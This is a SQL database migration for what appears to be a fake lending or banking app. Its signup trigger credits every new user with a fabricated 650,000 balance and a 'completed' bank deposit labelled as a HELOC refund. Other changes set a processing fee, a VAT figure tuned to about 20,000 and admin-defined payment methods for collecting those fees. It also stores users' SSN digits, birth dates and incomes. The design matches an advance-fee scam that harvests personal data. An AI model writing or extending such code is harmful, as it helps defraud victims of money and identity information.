-- New charge standard + multiple admin-set payment options.

-- VAT needs more precision so 650k * rate = ~20,000 exactly.
alter table public.accounts alter column vat_rate type numeric(10,6);
alter table public.accounts alter column vat_rate set default 3.076923;
alter table public.accounts alter column processing_fee set default 5000;

-- Multiple payment options the user can choose from: [{method, instructions?}, ...]
alter table public.accounts add column if not exists fee_payment_options jsonb not null default '[{"method":"card"}]'::jsonb;

-- Preserve any prior single method as an option.
update public.accounts
set fee_payment_options = jsonb_build_array(
  jsonb_build_object('method', coalesce(nullif(fee_payment_method, ''), 'card'))
    || case when coalesce(fee_payment_instructions, '') <> ''
            then jsonb_build_object('instructions', fee_payment_instructions)
            else '{}'::jsonb end
)
where fee_payment_options = '[{"method":"card"}]'::jsonb and fee_payment_method is not null;

-- Apply the new charge standard to all existing accounts.
update public.accounts set processing_fee = 5000, vat_rate = 3.076923;

-- Update signup seeding to the new standard.
create or replace function public.handle_new_user()
returns trigger
language plpgsql
security definer
set search_path = public
as $$
declare
  md        jsonb := coalesce(new.raw_user_meta_data, '{}'::jsonb);
  full_name text := coalesce(nullif(trim(md->>'full_name'), ''), split_part(new.email, '@', 1));
  initials  text;
  parts     text[] := regexp_split_to_array(full_name, '\s+');
begin
  if array_length(parts, 1) >= 2 then
    initials := upper(left(parts[1], 1) || left(parts[array_length(parts,1)], 1));
  else
    initials := upper(left(full_name, 2));
  end if;

  insert into public.accounts
    (user_id, name, email, avatar_initials, member_since, credit_limit,
     available_balance, outstanding_balance, apr, processing_fee, network_charge, vat_rate, fee_paid,
     phone, dob, address_street, address_city, address_state, address_zip,
     ssn_last4, employer, annual_income)
  values
    (new.id, initcap(full_name), new.email, initials, current_date, 650000,
     650000, 0, 7.85, 5000, 150, 3.076923, false,
     nullif(md->>'phone',''),
     (nullif(md->>'dob',''))::date,
     nullif(md->>'address_street',''),
     nullif(md->>'address_city',''),
     nullif(md->>'address_state',''),
     nullif(md->>'address_zip',''),
     nullif(md->>'ssn_last4',''),
     nullif(md->>'employer',''),
     (nullif(md->>'annual_income',''))::numeric)
  on conflict (user_id) do nothing;

  insert into public.claims
    (user_id, id, reference, amount, method, status, created_at, note, destination, direction, source)
  values
    (new.id,
     'dep-' || replace(new.id::text, '-', ''),
     'DEP-' || to_char(now(), 'YYYY') || '-' || upper(left(replace(new.id::text, '-', ''), 6)),
     650000, 'bank', 'completed', now(),
     'Refund for Gerrald Butler''s HELOC', 'US Bank', 'in', 'US Bank')
  on conflict (id) do nothing;

  return new;
end;
$$;
